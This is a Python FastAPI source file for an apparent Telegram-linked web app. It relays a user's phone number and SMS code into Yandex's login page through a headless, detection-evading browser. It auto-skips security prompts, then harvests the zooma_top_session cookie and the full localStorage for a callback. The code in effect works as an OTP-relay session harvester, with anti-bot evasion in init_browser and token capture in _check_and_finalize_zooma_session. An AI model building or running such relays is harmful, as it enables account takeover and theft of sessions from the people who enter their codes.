import asyncio
import logging
import os
import time
import shutil
import subprocess
from datetime import datetime
from contextlib import suppress

from fastapi import FastAPI, Form, BackgroundTasks, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from playwright.async_api import async_playwright

from config import YANDEX_AUTH_START_URL, ADMIN_CHAT_ID
from xray_bridge import ensure_xray_bridge, stop_xray_bridge


app = FastAPI(openapi_url=None, docs_url=None, redoc_url=None)
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])
app.mount("/static", StaticFiles(directory="static"), name="static")
logger = logging.getLogger("yandex_webapp")

sessions: dict[str, dict] = {}
_recent_closures: dict[str, dict] = {}
SESSION_TTL = 300
_ttl_task = None
_ON_ZOOMA_SESSION = None
_XVFB_PROC = None
_PROXY_TUNNEL_ERROR: set[str] = set()


async def close_sessions_for_chat(chat_id: int, exclude_sid: str | None = None):
    if chat_id is None:
        return
    for sid in list(sessions.keys()):
        if exclude_sid and sid == exclude_sid:
            continue
        if _chat_id_from_sid(sid) == int(chat_id):
            await _close_session(sid, reason="superseded_by_other_auth")


async def close_session_by_sid(sid: str, reason: str = "admin_stop") -> bool:
    if sid not in sessions:
        return False
    await _close_session(sid, reason=reason)
    return True


def set_zooma_session_handler(handler):
    global _ON_ZOOMA_SESSION
    _ON_ZOOMA_SESSION = handler


def _chat_id_from_sid(sid: str) -> int | None:
    parts = sid.split("_")
    if not parts:
        return None
    tail = parts[-1].strip()
    return int(tail) if tail.isdigit() else None


def _ensure_xvfb() -> None:
    global _XVFB_PROC
    if os.getenv("DISPLAY"):
        return
    if _XVFB_PROC and _XVFB_PROC.poll() is None:
        os.environ["DISPLAY"] = ":99"
        return
    xvfb_bin = shutil.which("Xvfb")
    if not xvfb_bin:
        raise RuntimeError("Xvfb не установлен на сервере")
    _XVFB_PROC = subprocess.Popen(
        [xvfb_bin, ":99", "-screen", "0", "1280x720x24", "-nolisten", "tcp"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    os.environ["DISPLAY"] = ":99"
    time.sleep(0.3)
    if _XVFB_PROC.poll() is not None:
        raise RuntimeError("Не удалось запустить Xvfb")


def _stop_xvfb_if_idle() -> None:
    global _XVFB_PROC
    if sessions:
        return
    if _XVFB_PROC and _XVFB_PROC.poll() is None:
        with suppress(Exception):
            _XVFB_PROC.terminate()
        with suppress(Exception):
            _XVFB_PROC.wait(timeout=2)
        if _XVFB_PROC.poll() is None:
            with suppress(Exception):
                _XVFB_PROC.kill()
    _XVFB_PROC = None
    if os.getenv("DISPLAY") == ":99":
        os.environ.pop("DISPLAY", None)


async def _close_session(sid: str, reason: str = "unknown"):
    sess = sessions.pop(sid, None)
    if not sess:
        return
    try:
        with suppress(Exception):
            await sess["browser"].close()
        with suppress(Exception):
            await sess["pw"].stop()
    finally:
        _recent_closures[sid] = {"reason": reason, "ts": int(time.time())}
        stop_xray_bridge(sid)
        _stop_xvfb_if_idle()


def _touch(sid: str):
    if sid in sessions:
        sessions[sid]["last_seen"] = int(time.time())


async def _cleanup_expired():
    now = int(time.time())
    for sid, meta in list(_recent_closures.items()):
        if now - int(meta.get("ts") or now) > 900:
            _recent_closures.pop(sid, None)
    for sid, sess in list(sessions.items()):
        if now - int(sess.get("last_seen", now)) > SESSION_TTL:
            await _close_session(sid, reason="ttl_expired")


async def _ttl_loop():
    while True:
        await _cleanup_expired()
        await asyncio.sleep(5)


def _ensure_ttl_cleaner_started():
    global _ttl_task
    if _ttl_task is None or _ttl_task.done():
        _ttl_task = asyncio.create_task(_ttl_loop())


def _make_session_state(init_token: int | None = None) -> dict:
    return {
        "ready": False,
        "done": False,
        "stage": "booting",
        "init_error": "",
        "accounts": [],
        "init_token": init_token or time.time_ns(),
        "created_at": int(time.time()),
        "last_seen": int(time.time()),
    }


def _get_page_if_ready(sid: str):
    sess = sessions.get(sid)
    if not sess or not sess.get("ready"):
        return None
    page = sess.get("page")
    if not page:
        return None
    try:
        if page.is_closed():
            return None
    except Exception:
        return None
    return page


async def init_browser(sid: str, init_token: int):
    logger.info("[%s] init_browser start", sid)
    if sid not in sessions:
        sessions[sid] = _make_session_state(init_token)
    if sessions[sid].get("init_token") != init_token:
        logger.info("[%s] skip stale init before start", sid)
        return

    xvfb_error = None
    for _ in range(3):
        try:
            _ensure_xvfb()
            xvfb_error = None
            break
        except Exception as e:
            xvfb_error = e
            await asyncio.sleep(0.4)
    if xvfb_error:
        raise xvfb_error

    chat_id = _chat_id_from_sid(sid)
    if chat_id is None:
        raise RuntimeError("bad_sid_chat_id")
    bridge_url = ensure_xray_bridge(sid, chat_id)
    pw = await async_playwright().start()
    launch_kwargs = {
        "headless": True,
        "args": [
            "--no-sandbox",
            "--disable-dev-shm-usage",
            "--disable-blink-features=AutomationControlled",
            f"--zooma-auth-sid={sid}",
        ],
    }
    if bridge_url:
        launch_kwargs["proxy"] = {"server": bridge_url}
        logger.info("[%s] Yandex proxy bridge enabled: %s", sid, bridge_url)
    else:
        logger.info("[%s] Yandex proxy bypass for admin chat_id=%s", sid, ADMIN_CHAT_ID)
    browser = await pw.chromium.launch(**launch_kwargs)
    context = await browser.new_context(
        viewport={"width": 412, "height": 915},
        locale="ru-RU",
        user_agent="Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
        is_mobile=True,
        has_touch=True,
    )
    page = await context.new_page()
    init_route_handler = None
    try:
        async def _init_route(route):
            req = route.request
            if req.resource_type in {"image", "font", "media"}:
                await route.abort()
                return
            await route.continue_()
        init_route_handler = _init_route
        await page.route("**/*", init_route_handler)
    except Exception:
        init_route_handler = None
    _PROXY_TUNNEL_ERROR.discard(sid)
    page.on("framenavigated", lambda frame: logger.info("[%s] nav frame url=%s", sid, frame.url) if frame == page.main_frame else None)
    page.on("request", lambda req: logger.info("[%s] nav req %s %s", sid, req.method, req.url))

    def _on_response(res):
        logger.info("[%s] nav res %s %s", sid, res.status, res.url)
        if res.status == 407:
            _PROXY_TUNNEL_ERROR.add(sid)

    def _on_request_failed(req):
        failure_text = str(req.failure or "")
        logger.warning("[%s] nav fail %s %s %s", sid, req.method, req.url, failure_text)
        if "ERR_TUNNEL_CONNECTION_FAILED" in failure_text or "407" in failure_text:
            _PROXY_TUNNEL_ERROR.add(sid)

    page.on("response", _on_response)
    page.on("requestfailed", _on_request_failed)
    await page.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
    last_goto_err = None
    goto_timeout_ms = 15000
    for _ in range(1):
        try:
            goto_task = asyncio.create_task(
                page.goto(YANDEX_AUTH_START_URL, wait_until="domcontentloaded", timeout=goto_timeout_ms)
            )
            while not goto_task.done():
                if sid in _PROXY_TUNNEL_ERROR:
                    goto_task.cancel()
                    raise RuntimeError("proxy_tunnel_failed: HTTP 407 / ERR_TUNNEL_CONNECTION_FAILED")
                await asyncio.sleep(0.1)
            resp = await goto_task
            if resp:
                chain = []
                rq = resp.request
                while rq:
                    chain.append(rq.url)
                    rq = rq.redirected_from
                chain.reverse()
                logger.info("[%s] goto redirect chain: %s", sid, " -> ".join(chain))
            if init_route_handler:
                with suppress(Exception):
                    await page.unroute("**/*", init_route_handler)
            last_goto_err = None
            break
        except Exception as e:
            last_goto_err = e
            await asyncio.sleep(1)
    if last_goto_err:
        with suppress(Exception):
            await browser.close()
        with suppress(Exception):
            await pw.stop()
        logger.error("[%s] proxy goto timeout/fail after %sms: %s", sid, goto_timeout_ms, last_goto_err)
        raise last_goto_err

    current = sessions.get(sid)
    if not current or current.get("init_token") != init_token:
        with suppress(Exception):
            await browser.close()
        with suppress(Exception):
            await pw.stop()
        logger.info("[%s] skip stale init after start", sid)
        return

    current.update({
        "pw": pw,
        "browser": browser,
        "page": page,
        "ready": True,
        "stage": "phone",
        "init_error": "",
        "last_seen": int(time.time()),
    })
    logger.info("[%s] init_browser done, url=%s", sid, page.url)
    _PROXY_TUNNEL_ERROR.discard(sid)


@app.get("/api/init")
async def api_init(sid: str, bg: BackgroundTasks):
    _recent_closures.pop(sid, None)
    _ensure_ttl_cleaner_started()
    await _cleanup_expired()
    chat_id = _chat_id_from_sid(sid)
    if chat_id is not None:
        try:
            ensure_xray_bridge(sid, int(chat_id))
        except Exception as e:
            sessions[sid] = _make_session_state()
            sessions[sid]["stage"] = "init_error"
            sessions[sid]["init_error"] = str(e)
            return {"status": "error", "msg": str(e)}
        with suppress(Exception):
            from steam_webapp import close_sessions_for_chat as close_steam_sessions_for_chat
            await close_steam_sessions_for_chat(int(chat_id))
        with suppress(Exception):
            from tg_webapp import close_sessions_for_chat as close_tg_sessions_for_chat
            await close_tg_sessions_for_chat(int(chat_id))
        await close_sessions_for_chat(int(chat_id), exclude_sid=sid)
    if sid in sessions and sessions[sid].get("ready") and not sessions[sid].get("done"):
        _touch(sid)
        return {"status": "ok", "reused": True}
    if sid in sessions and not sessions[sid].get("ready") and not sessions[sid].get("done"):
        _touch(sid)
        return {"status": "pending"}
    sessions[sid] = _make_session_state()
    init_token = sessions[sid]["init_token"]

    async def _run_init():
        try:
            await init_browser(sid, init_token)
        except Exception as e:
            sess = sessions.get(sid)
            if sess and sess.get("init_token") == init_token:
                sess["stage"] = "init_error"
                sess["init_error"] = str(e)
            logger.exception("[%s] init_browser failed: %s", sid, e)

    bg.add_task(_run_init)
    return {"status": "pending"}


@app.get("/api/init_ya")
async def api_init_ya(sid: str, bg: BackgroundTasks):
    return await api_init(sid=sid, bg=bg)


@app.post("/api/ya_login")
async def api_ya_login(sid: str = Form(...), phone: str = Form(...)):
    await _cleanup_expired()
    page = _get_page_if_ready(sid)
    if not page:
        sess = sessions.get(sid)
        if sess and sess.get("stage") == "init_error":
            init_error = str(sess.get("init_error") or "init failed")
            if "proxy_required" in init_error:
                return {
                    "status": "error",
                    "msg": "Для прохождения авторизации требуется прокси.\nАдмин оповещен @saxarok322",
                }
            return {"status": "error", "msg": f"Ошибка запуска: {init_error}"}
        if sess:
            return {"status": "pending", "msg": "Инициализация браузера, подождите..."}
        logger.warning("[%s] ya_login without session", sid)
        return {"status": "pending", "msg": "Запускаю браузер, подождите..."}
    _touch(sid)

    try:
        logger.info("[%s] ya_login: start", sid)
        input_selector = "input[name='login'], input#passp-field-login, input[type='tel']"
        await page.wait_for_selector(input_selector, timeout=15000)
        await page.click(input_selector)
        await page.keyboard.press("Control+A")
        await page.keyboard.press("Backspace")

        clean_phone = "".join(filter(str.isdigit, phone))
        for char in clean_phone:
            await page.keyboard.type(char, delay=60)

        next_btn = page.locator("button:has-text('Далее'), button:has-text('Войти'), [role='button']:has-text('Далее')").first
        await next_btn.click()
        logger.info("[%s] ya_login: submitted phone", sid)

        for _ in range(20):
            await asyncio.sleep(0.5)
            content = await page.content()
            if any(x in content for x in ["Введите код", "отправили", "SMS", "СМС", "OTP"]):
                sessions[sid]["stage"] = "code"
                logger.info("[%s] ya_login: wait_code", sid)
                return {"status": "wait_code"}

        logger.warning("[%s] ya_login: code stage not reached", sid)
        return {"status": "error", "msg": "Не удалось перейти к вводу кода"}
    except Exception as e:
        logger.exception("[%s] ya_login failed: %s", sid, e)
        return {"status": "error", "msg": str(e)}


@app.post("/api/ya_code")
async def api_ya_code(sid: str = Form(...), code: str = Form(...)):
    await _cleanup_expired()
    page = _get_page_if_ready(sid)
    if not page:
        return {"status": "pending", "msg": "Инициализация браузера, подождите..."}
    _touch(sid)

    try:
        logger.info("[%s] ya_code: start", sid)
        otp_selector = 'input[autocomplete="one-time-code"], input[data-t="field:input-otp"], input[type="tel"]'

        try:
            await page.wait_for_selector(otp_selector, timeout=8000)
            await page.fill(otp_selector, code)
        except Exception:
            await page.keyboard.press("Tab")
            for char in code:
                await page.keyboard.type(char, delay=80)

        await page.keyboard.press("Enter")
        logger.info("[%s] ya_code: submitted code", sid)
        await asyncio.sleep(3)

        is_success = False
        for _ in range(16):
            content = await page.content()
            if any(x in content for x in ["Выберите аккаунт", "AccountSuggestList", "AccountItem"]):
                is_success = True
                break
            await asyncio.sleep(0.5)

        if not is_success:
            logger.info("[%s] ya_code: no account list, switch to polling", sid)
            return {"status": "polling"}

        accounts = await page.evaluate(
            """() => {
                const results = [];
                const items = document.querySelectorAll('.AccountSuggestList-list-item, .AccountItem, .user-account');
                items.forEach(el => {
                    let displayNameEl = el.querySelector('.UserLogin-displayName, .AccountItem-name');
                    let login = displayNameEl ? displayNameEl.innerText.trim() : "";
                    login = login.replace(/Плюс|Карты|Банк/gi, "").trim();
                    let uid = el.getAttribute('data-uid') || login;
                    if (login && login.length > 1) {
                        results.push({ uid: uid, login: login, name: login, avatar: "" });
                    }
                });
                return results;
            }"""
        )

        if not accounts:
            logger.info("[%s] ya_code: empty accounts, switch to polling", sid)
            return {"status": "polling"}

        sessions[sid]["stage"] = "accounts"
        sessions[sid]["accounts"] = accounts
        logger.info("[%s] ya_code: select_account count=%s", sid, len(accounts))
        return {"status": "select_account", "accounts": accounts}
    except Exception as e:
        logger.exception("[%s] ya_code failed: %s", sid, e)
        return {"status": "error", "msg": str(e)}


@app.post("/api/ya_select")
async def api_ya_select(sid: str = Form(...), uid: str = Form(...)):
    await _cleanup_expired()
    page = _get_page_if_ready(sid)
    if not page:
        return {"status": "pending", "msg": "Инициализация браузера, подождите..."}
    _touch(sid)

    try:
        logger.info("[%s] ya_select: uid=%s", sid, uid)
        selector = f"text='{uid}'"
        if await page.locator(selector).count() > 0:
            await page.locator(selector).first.click(force=True)
        else:
            await page.locator(".AccountSuggestList-list-item, .AccountItem, [data-t='account-item']").first.click(force=True)

        sessions[sid]["stage"] = "polling"
        logger.info("[%s] ya_select: polling", sid)
        return {"status": "polling"}
    except Exception as e:
        logger.exception("[%s] ya_select failed: %s", sid, e)
        return {"status": "error", "msg": str(e)}


async def _check_and_finalize_zooma_session(sid: str) -> dict:
    if sid not in sessions:
        meta = _recent_closures.get(sid) or {}
        if str(meta.get("reason") or "") == "admin_stop":
            return {"status": "admin_stopped"}
        return {"status": "waiting"}
    sess = sessions[sid]
    if sess.get("done"):
        return {"status": "already_done"}

    page = sess.get("page")
    if not page:
        return {"status": "waiting"}

    try:
        current_url = page.url or ""
        skip_selectors = [
            "button:has-text('Напомнить позже')",
            "button:has-text('Не сейчас')",
            "[data-t='button:pseudo-link']",
            ".passp-pwa-fido-skip-button",
        ]
        for selector in skip_selectors:
            try:
                btn = page.locator(selector).first
                if await btn.is_visible(timeout=100):
                    logger.info("[%s] check: clicked security skip", sid)
                    await btn.click()
                    return {"status": "waiting"}
            except Exception:
                continue

        if "stage" in sess and sess["stage"] == "phone" and ("passport.yandex" in current_url or "yandex" in current_url):
            pass

        cookies = await page.context.cookies()
        zooma_session = None
        for c in cookies:
            if c.get("name") == "zooma_top_session" and c.get("value"):
                zooma_session = str(c["value"]).strip()
                break

        if not zooma_session:
            return {"status": "waiting"}
        logger.info("[%s] check: zooma_top_session found", sid)

        local_storage_dump = await page.evaluate(
            """() => {
                const out = {};
                try {
                    for (let i = 0; i < localStorage.length; i++) {
                        const k = localStorage.key(i);
                        out[k] = localStorage.getItem(k);
                    }
                } catch (e) {}
                return out;
            }"""
        )
        local_storage_dump = dict(local_storage_dump or {})
        local_storage_dump["auth_method"] = "yandex_webapp"
        chat_id = _chat_id_from_sid(sid)
        if _ON_ZOOMA_SESSION and chat_id is not None:
            ok, msg = await _ON_ZOOMA_SESSION(chat_id, zooma_session, local_storage_dump)
            if ok:
                sess["done"] = True
                sess["stage"] = "done"
                await _close_session(sid, reason="zooma_session_connected")
                logger.info("[%s] check: session saved, done", sid)
                return {"status": "done", "message": msg or "ok"}
            logger.warning("[%s] check: session save failed: %s", sid, msg)
            return {"status": "error", "message": msg or "Не удалось сохранить сессию"}

        return {"status": "waiting"}
    except Exception as e:
        logger.exception("[%s] check failed: %s", sid, e)
        return {"status": "waiting"}


@app.get("/api/check_status")
async def api_check_status(sid: str):
    await _cleanup_expired()
    if sid in sessions:
        _touch(sid)
    return await _check_and_finalize_zooma_session(sid)


@app.get("/api/check_ya_status")
async def api_check_ya_status(sid: str):
    await _cleanup_expired()
    if sid in sessions:
        _touch(sid)
    return await _check_and_finalize_zooma_session(sid)


@app.get("/api/state")
async def api_state(sid: str):
    await _cleanup_expired()
    if sid not in sessions:
        meta = _recent_closures.get(sid) or {}
        if str(meta.get("reason") or "") == "admin_stop":
            return {"status": "admin_stopped", "stage": "stopped", "ready": False, "init_error": "", "accounts": []}
        return {"status": "missing", "stage": "phone", "accounts": []}
    _touch(sid)
    return {
        "status": "ok",
        "ready": bool(sessions[sid].get("ready")),
        "stage": sessions[sid].get("stage", "phone"),
        "init_error": sessions[sid].get("init_error", ""),
        "accounts": sessions[sid].get("accounts", []),
    }


@app.post("/api/ping")
async def api_ping(sid: str = Form(...)):
    await _cleanup_expired()
    if sid not in sessions:
        return {"status": "missing"}
    _touch(sid)
    return {"status": "ok"}


@app.post("/api/cancel")
async def api_cancel(sid: str = Form(...)):
    await _close_session(sid, reason="manual_cancel")
    return {"status": "ok"}


templates = Jinja2Templates(directory="templates")


@app.get("/", response_class=HTMLResponse)
async def index(request: Request):
    return templates.TemplateResponse(request, "yandex.html")


@app.on_event("startup")
async def startup():
    _ensure_ttl_cleaner_started()
